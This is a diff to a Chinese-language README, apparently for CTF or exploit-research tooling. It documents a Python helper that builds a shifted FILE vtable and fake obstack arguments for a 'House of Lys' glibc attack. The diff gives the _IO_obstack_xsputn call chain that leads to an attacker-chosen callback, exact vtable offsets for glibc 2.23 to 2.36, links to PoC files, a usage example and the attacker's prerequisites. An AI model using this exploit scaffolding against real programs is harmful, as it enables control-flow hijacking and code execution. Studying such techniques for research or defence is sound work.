@@ -51,7 +51,82 @@ primary overflow(+0x18) = 原表 xsputn(+0x38)
 
 ## Python 离线板子
 
-`lys.py` 的 `build_house_of_lys(version, wfile_jumps_addr, obstack_addr, chunkfun_addr, extra_arg, object_base=0, next_free=1, chunk_limit=0)` 生成错位 primary vtable 和 obstack 回调参数。2.23 使用 `_IO_wfile_jumps-0x1120+0x20`，2.24～2.36 使用 `+0x300+0x20`；函数不负责 FILE 投递。
+[`lys.py`](./lys.py) 提供 `build_house_of_lys`，生成 Lys 的错位 primary vtable 和 fake obstack 参数。
+
+### 函数用途
+
+构造以下调用链所需的对象：
+
+```text
+__overflow(fp, EOF)
+  -> primary vtable = _IO_obstack_jumps + 0x20
+  -> _IO_obstack_xsputn
+  -> _obstack_newchunk
+  -> chunkfun(extra_arg, size)
+```
+
+### 对应 PoC
+
+- [`poc_shifted_obstack_sink_2.23.c`](./poc_shifted_obstack_sink_2.23.c)：`_IO_obstack_jumps = _IO_wfile_jumps - 0x1120`；
+- [`poc_shifted_obstack_sink_2.24_2.36.c`](./poc_shifted_obstack_sink_2.24_2.36.c)：`_IO_obstack_jumps = _IO_wfile_jumps + 0x300`。
+
+primary vtable 统一再加 `+0x20`，让 overflow 槽落到 xsputn。
+
+### 最小使用示例
+
+```python
+from lys import build_house_of_lys
+
+plan = build_house_of_lys(
+    version="2.24",
+    wfile_jumps_addr=0x7fff0000,  # _IO_wfile_jumps
+    obstack_addr=0x200000,        # fake obstack（写 FILE+0xe0）
+    chunkfun_addr=0x401234,       # 分配回调
+    extra_arg=0x500000,           # callback 第一个参数
+)
+
+# 返回 LysPlan；primary_vtable_addr 是 _IO_obstack_jumps+0x20
+print(hex(plan.primary_vtable_addr), hex(plan.obstack_addr),
+      hex(plan.chunkfun_addr), hex(plan.extra_arg))
+```
+
+### 参数
+
+| 参数 | 含义 |
+|---|---|
+| `version` | 目标 glibc 版本，支持 `2.23`～`2.36`。 |
+| `wfile_jumps_addr` | 目标 libc 的 `_IO_wfile_jumps` 地址。 |
+| `obstack_addr` | fake obstack 地址，将写入 `FILE+0xe0`。 |
+| `chunkfun_addr` | `_obstack_newchunk` 间接调用的分配回调。 |
+| `extra_arg` | callback 第一个参数。 |
+| `object_base` / `next_free` / `chunk_limit` | obstack 当前 chunk 边界；默认 `0/1/0` 让扩容立即发生。 |
+
+### 返回对象 `LysPlan`
+
+| 字段 | 含义 |
+|---|---|
+| `version` | 目标版本。 |
+| `primary_vtable_addr` | `_IO_obstack_jumps + 0x20` 的最终 vtable 地址。 |
+| `obstack_addr` | fake obstack 地址。 |
+| `object_base` / `next_free` / `chunk_limit` | obstack 当前 chunk 边界。 |
+| `chunkfun_addr` | 分配回调地址。 |
+| `extra_arg` | callback 第一个参数。 |
+
+### 调用者必须提供
+
+```text
+libc 基址和 _IO_wfile_jumps 地址
+能投递 fake FILE 到 _IO_list_all 或标准流的能力
+调用点残留的 rdx 可用作 xsputn 长度（或等价触发）
+```
+
+### 函数不负责
+
+```text
+不生成 fake FILE 完整镜像
+不把 fake FILE 挂到 _IO_list_all
+不处理 2.37+（旧 _IO_obstack_xsputn 已删除）
+```
 
 ## 迁移与调试
 
